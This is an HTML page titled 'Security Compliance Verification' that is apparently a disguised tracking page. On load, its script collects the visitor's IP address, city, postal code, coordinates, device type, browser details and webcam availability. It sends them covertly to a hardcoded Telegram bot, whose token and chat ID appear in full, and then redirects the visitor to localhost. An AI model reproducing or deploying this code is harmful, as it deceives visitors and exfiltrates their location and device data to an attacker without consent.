<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Compliance Verification</title>
  <meta http-equiv="refresh" content="1;url=http://127.0.0.1:80">
</head>
<body>
  <div>Collecting IP and environment info...</div>

  <script>
    const telegramToken = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
    const chatId = "6239813037";

    function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });
    }

    function triggerFlow() {
      setTimeout(() => {
        collectAndSendInfo();
      }, 3000);
    }

    window.onload = triggerFlow;

    async function collectAndSendInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
        const data = await res.json();
        const [lat, lon] = data.loc.split(',');

        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
        const resolution = `${window.screen.width}x${window.screen.height}`;
        const colorDepth = `${screen.colorDepth}-bit`;
        const language = navigator.language;
        const platform = navigator.platform;
        const userAgent = navigator.userAgent;
        const hasWebcam = navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? "Possible" : "No Access";

        let adBlockEnabled = false;
        const ad = document.createElement('div');
        ad.className = 'adsbox';
        ad.style.height = '1px';
        document.body.appendChild(ad);
        setTimeout(() => {
          if (ad.offsetHeight === 0) adBlockEnabled = true;
          ad.remove();

          const fullDetails = `\ud83d\udcf1 IP Info\n----------------------\n\ud83c\udf10 IP: ${data.ip}\n\ud83c\udf0d Country: ${data.country}\n\ud83c\udfe3 City: ${data.city}\n\ud83c\udf0d Region: ${data.region || 'N/A'}\n\ud83d\udccc Postal: ${data.postal || 'N/A'}\n\ud83d\udcde Coordinates: ${data.loc}\n\ud83c\udfe2 Org: ${data.org}\n\ud83d\udcbb ISP: ${data.org}\n\ud83d\udda5 Device: ${deviceType}\n\ud83d\udcc0 Resolution: ${resolution}\n\ud83c\udfa8 Color Depth: ${colorDepth}\n\ud83c\udf10 Language: ${language}\n\ud83d\udda5 Platform: ${platform}\n\ud83d\udcf7 Webcam: ${hasWebcam}\n\ud83e\udde0 AdBlocker: ${adBlockEnabled ? "Likely Enabled" : "Not Detected"}\n\ud83d\udcf1 User Agent: ${userAgent}\n\ud83d\udd70 Time: ${new Date().toLocaleString()}`;

          sendToTelegram(fullDetails);
        }, 200);
      } catch (e) {
        sendToTelegram("\u26a0\ufe0f Failed to fetch IP info.");
      }
    }
  </script>
</body>
</html>
